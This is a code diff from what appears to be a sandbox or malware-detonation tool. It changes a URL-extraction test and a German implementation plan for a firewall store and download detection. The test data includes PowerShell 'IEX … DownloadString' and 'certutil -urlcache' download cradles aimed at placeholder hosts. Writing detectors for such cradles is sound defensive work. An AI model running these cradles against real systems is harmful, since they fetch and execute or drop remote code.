@@ -289,7 +289,7 @@ def test_urls_in_finds_cradles_and_ignores_the_rest():
     assert urls_in("IEX(New-Object Net.WebClient).DownloadString('http://a.b/c.dll')") == ["http://a.b/c.dll"]
     assert urls_in("certutil -urlcache -f https://x.y/z.exe out.exe") == ["https://x.y/z.exe"]
     assert urls_in("no url here") == []
-    assert urls_in("http://" + "a" * 5000) == []          # length guard
+    assert urls_in("http://" + "a" * 9000) == []          # length guard
 
 def test_download_finding_only_for_executables_in_a_detonation():
     f = download_findings([ps("… 'http://a.b/c.dll'", pid=4812)], [], [], FLOWS, {4812})
@@ -349,7 +349,7 @@ Expected: FAIL, `ModuleNotFoundError: firewall_store`
 
 - [ ] **Step 3: Implement `webui/firewall_store.py`**
 
-`FirewallStore` hält einen `deque` der Einzelverbindungen (für `raw_for` und die Beaconing-Erkennung) und baut `connections()` daraus über `firewall.bundle`. Cursor je Ereignis-ID als `EventRecordID`, wie `log_store.Collector` es macht. `urls_in` begrenzt die Länge einer URL auf 2048 und die Anzahl pro Text auf 20, kein benutzergesteuerter Regex. `download_findings` verlangt: Endung in `EXECUTABLE_SUFFIXES` (`.exe .dll .scr .ps1 .bat .cmd .vbs .js .hta .msi .jar .lnk .cpl .ocx`) **oder** ein `Content-Disposition`-freies BITS-Ziel mit solcher Endung, und die PID (oder ein Vorfahr) in `submission_pids` — außer der Aufrufer gibt `ask_mode="all"` durch. Die Findung trägt `{id, pid, image, url, dst_ip, dst_port, source, observed_at}`.
+`FirewallStore` hält einen `deque` der Einzelverbindungen (für `raw_for` und die Beaconing-Erkennung) und baut `connections()` daraus über `firewall.bundle`. Die Sysmon-Quellen lesen über die Zeit (`since_iso` mit 5 s Überlappung, Dedup im Store), wie `log_store.Collector._tick_sysmon`; `EventRecordID`-Cursor bleiben für PowerShell und BITS. `urls_in` begrenzt die Länge einer URL auf 8192 und die Anzahl pro Text auf 20, kein benutzergesteuerter Regex; die URLs werden **vor** dem Kürzen des Textes gezogen und am Ereignis als `urls` abgelegt. `download_findings` verlangt: Endung in `EXECUTABLE_SUFFIXES` (`.exe .dll .scr .ps1 .bat .cmd .vbs .js .hta .msi .jar .lnk .cpl .ocx`) **oder** ein `Content-Disposition`-freies BITS-Ziel mit solcher Endung. Jede Findung trägt `{id, pid, image, url, dst_ip, dst_port, source, observed_at, in_detonation, self, requested_by}`; über `ask_mode` entscheidet nicht dieses Modul, sondern Task 5.
 
 `PendingStore` schreibt atomar wie `_save_submissions` (`app.py:757`), hält höchstens 200 offene und 24 h Verlauf, und `resolve` ist durch ein Lock plus die Prüfung auf ein bereits gesetztes `action` idempotent.
 
